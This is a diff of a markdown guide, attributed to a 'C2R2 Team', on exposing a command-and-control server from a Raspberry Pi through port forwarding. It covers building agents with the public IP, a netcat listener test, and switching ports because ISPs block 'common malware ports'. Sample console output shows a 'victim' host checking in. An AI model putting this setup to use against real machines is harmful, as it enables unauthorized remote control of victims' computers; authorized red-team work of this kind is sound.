@@ -1,24 +1,24 @@
 # Raspberry Pi C2 Server Setup Guide
 
-## 🎯 Quick Start: Raspberry Pi with Port Forwarding
+##  Quick Start: Raspberry Pi with Port Forwarding
 
 This guide walks you through setting up C2R2 server on a Raspberry Pi accessible from the internet via port forwarding.
 
 ---
 
-## ⚠️ Problem: "El agente no alcanza el servidor con port forward"
+##  Problem: "El agente no alcanza el servidor con port forward"
 
 If you're experiencing this issue, the most common causes are:
 
-1. ✅ **Server not binding to all interfaces** - Server only listening on localhost
-2. ✅ **Port forwarding misconfigured** - Wrong internal IP or port mismatch
-3. ✅ **Firewall blocking connections** - UFW/iptables blocking port 4444
-4. ✅ **Agent built with wrong IP** - Agent configured with LAN IP instead of public IP
-5. ✅ **CGNAT issue** - ISP using Carrier-Grade NAT
+1.  **Server not binding to all interfaces** - Server only listening on localhost
+2.  **Port forwarding misconfigured** - Wrong internal IP or port mismatch
+3.  **Firewall blocking connections** - UFW/iptables blocking port 4444
+4.  **Agent built with wrong IP** - Agent configured with LAN IP instead of public IP
+5.  **CGNAT issue** - ISP using Carrier-Grade NAT
 
 ---
 
-## 📋 Step-by-Step Setup
+##  Step-by-Step Setup
 
 ### Step 1: Prepare Raspberry Pi
 
@@ -115,9 +115,9 @@ Expected output:
 ║              Direct Connection - No Shellcode            ║
 ╚═══════════════════════════════════════════════════════════╝
 
-🌐 Listening: 0.0.0.0:4444
-📝 Help: /help
-📂 Logs: logs/
+ Listening: 0.0.0.0:4444
+ Help: /help
+ Logs: logs/
 ```
 
 ### Step 6: Verify Server is Listening
@@ -134,7 +134,7 @@ Expected output:
 tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      12345/c2r2-server
 ```
 
-**NOT**: `127.0.0.1:4444` ❌
+**NOT**: `127.0.0.1:4444`
 
 If you see `127.0.0.1:4444`, the server is only accepting local connections. Restart with `--bind 0.0.0.0`.
 
@@ -181,7 +181,7 @@ cargo run --release -- build-agent \
   --production
 ```
 
-**⚠️ IMPORTANT**: Use your **PUBLIC IP** (203.0.113.50), NOT your Raspberry Pi's LAN IP (192.168.1.100)!
+** IMPORTANT**: Use your **PUBLIC IP** (203.0.113.50), NOT your Raspberry Pi's LAN IP (192.168.1.100)!
 
 ### Step 9: Deploy and Test Agent
 
@@ -190,16 +190,16 @@ cargo run --release -- build-agent \
 3. On Raspberry Pi server console, you should see:
 
 ```
-🔗 Nuevo cliente [1] desde <target-ip>:xxxxx
-📝 [1] SYSINFO hostname: TARGET-PC
-📝 [1] SYSINFO username: victim
-📝 [1] SYSINFO OS: Windows 10 Pro
-📝 [1] SYSINFO privileges: User
+ Nuevo cliente [1] desde <target-ip>:xxxxx
+ [1] SYSINFO hostname: TARGET-PC
+ [1] SYSINFO username: victim
+ [1] SYSINFO OS: Windows 10 Pro
+ [1] SYSINFO privileges: User
 ```
 
 ---
 
-## 🔧 Troubleshooting
+##  Troubleshooting
 
 ### Issue 1: Port Test Fails from Internet
 
@@ -218,7 +218,7 @@ cargo run --release -- build-agent \
    # Some ISPs block common malware ports
    # Try a different port like 8443
    ./c2r2-server --bind 0.0.0.0 --port 8443
-   
+
    # Update router port forwarding to 8443
    # Rebuild agent with new port:
    cargo run --release -- build-agent \
@@ -232,7 +232,7 @@ cargo run --release -- build-agent \
    # Get your router's WAN IP (from router admin panel)
    # Compare with public IP from curl ifconfig.me
    # If different, you're behind CGNAT
-   
+
    # Solution: Contact ISP or use ngrok/VPN tunnel
    ```
 
@@ -292,7 +292,7 @@ sudo ufw status numbered
 
 ---
 
-## 📝 Configuration Verification Checklist
+##  Configuration Verification Checklist
 
 Before troubleshooting, verify each item:
 
@@ -322,7 +322,7 @@ Before troubleshooting, verify each item:
 
 ---
 
-## 🎓 Understanding the Connection Flow
+##  Understanding the Connection Flow
 
 ```
 ┌──────────────┐
@@ -353,7 +353,7 @@ Before troubleshooting, verify each item:
 
 ---
 
-## 🔒 Security Reminders
+##  Security Reminders
 
 1. **Production Mode**: Always use `--production` for real deployments
 2. **Change Default Port**: Don't use 4444 in production
@@ -373,7 +373,7 @@ sudo ufw enable
 
 ---
 
-## 📱 Alternative: Use DDNS if Public IP Changes
+##  Alternative: Use DDNS if Public IP Changes
 
 If your ISP assigns dynamic IPs:
 
@@ -391,11 +391,11 @@ cargo run --release -- build-agent \
   --production
 ```
 
-See [NETWORK_DEPLOYMENT.md](docs/NETWORK_DEPLOYMENT.md) for detailed DDNS setup.
+See the [troubleshooting documentation](../troubleshooting/) for detailed DDNS setup.
 
 ---
 
-## 🆘 Still Having Issues?
+##  Still Having Issues?
 
 1. **Enable verbose mode**:
    ```bash
@@ -411,10 +411,10 @@ See [NETWORK_DEPLOYMENT.md](docs/NETWORK_DEPLOYMENT.md) for detailed DDNS setup.
    ```bash
    # On Raspberry Pi, start simple TCP server
    nc -l -p 4444
-   
+
    # From internet, connect
    nc <public-ip> 4444
-   
+
    # Type messages to test bidirectional communication
    ```
 
@@ -425,11 +425,11 @@ See [NETWORK_DEPLOYMENT.md](docs/NETWORK_DEPLOYMENT.md) for detailed DDNS setup.
    ```
 
 5. **Review documentation**:
-   - [Network Deployment Guide](docs/NETWORK_DEPLOYMENT.md)
-   - [Troubleshooting Section](docs/USAGE.md#troubleshooting)
+   - [Troubleshooting documentation](../troubleshooting/)
+   - [Quick reference](../testing/QUICK_REFERENCE.md)
 
 ---
 
-**Author**: C2R2 Team  
-**Date**: November 2024  
+**Author**: C2R2 Team
+**Date**: November 2024
 **For**: Educational and authorized testing purposes only
